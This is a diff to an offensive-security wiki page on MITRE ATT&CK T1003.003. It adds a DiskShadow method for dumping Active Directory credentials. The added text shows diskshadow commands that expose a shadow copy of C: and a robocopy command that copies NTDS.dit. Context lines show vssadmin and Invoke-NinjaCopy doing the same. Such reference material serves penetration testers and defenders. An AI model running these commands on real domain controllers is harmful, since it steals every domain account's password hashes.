@@ -1,6 +1,6 @@
 ---
 description: MITRE ATT&CK™ Sub-technique T1003.003
-authors: ShutdownRepo, almandin, sckdev
+authors: ShutdownRepo, almandin, sckdev, 0xW1LD
 category: ad
 ---
 
@@ -62,6 +62,28 @@ vssadmin delete shadows /shadow=$ShadowCopyId
 
 ```bash
 Invoke-NinjaCopy.ps1 -Path "C:\Windows\NTDS\NTDS.dit" -LocalDestination "C:\Windows\Temp\ntds.dit.save"
+```
+
+### DiskShadow
+The `diskshadow.exe` utility can be used to interface with the Volume Shadow Copy Service.
+```powershell
+PS C:\Tools> diskshadow.exe
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation                                                       
+On computer:  BABYDC,  12/22/2025 2:15:01 AM
+
+DISKSHADOW> set verbose on
+DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
+DISKSHADOW> set context persistent nowriters
+DISKSHADOW> add volume C: alias cdrive
+DISKSHADOW> create
+DISKSHADOW> expose %cdrive% E:
+DISKSHADOW> exit
+```
+
+We can then copy the `NTDS.dit` file directly from the `E:` drive.
+```powershell
+PS C:\Tools> robocopy /B E:\Windows\NTDS .\ntds ntds.dit
 ```
 
 ## 2. Parsing
